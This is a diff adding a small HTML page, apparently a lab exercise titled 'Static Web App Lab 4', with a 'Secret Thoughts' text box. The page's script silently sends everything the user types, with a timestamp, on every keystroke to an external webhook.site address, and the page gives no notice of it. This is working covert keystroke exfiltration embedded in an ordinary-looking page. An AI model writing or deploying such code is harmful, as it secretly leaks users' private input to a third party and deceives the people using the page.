@@ -1,0 +1,27 @@
+<html>
+  <head>
+    <title>Static Web App Lab 4</title>
+  </head>
+  <body>
+    <div>
+      <h1>Static Web App Lab 4 - Write</h1>
+      <div>
+        <h2>Secret Thoughts</h2>
+        <textarea id="secretThoughts"></textarea>
+      </div>
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        const textarea = document.getElementById("secretThoughts");
+        if (textarea) {
+          textarea.addEventListener("input", function(e) {
+            const text = e.target.value;
+            fetch(
+              `https://webhook.site/10a65a81-d9e1-49c7-a131-816f3287d904?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+            ).catch(console.error);
+          });
+        }
+      });
+    </script>
+  </body>
+</html>
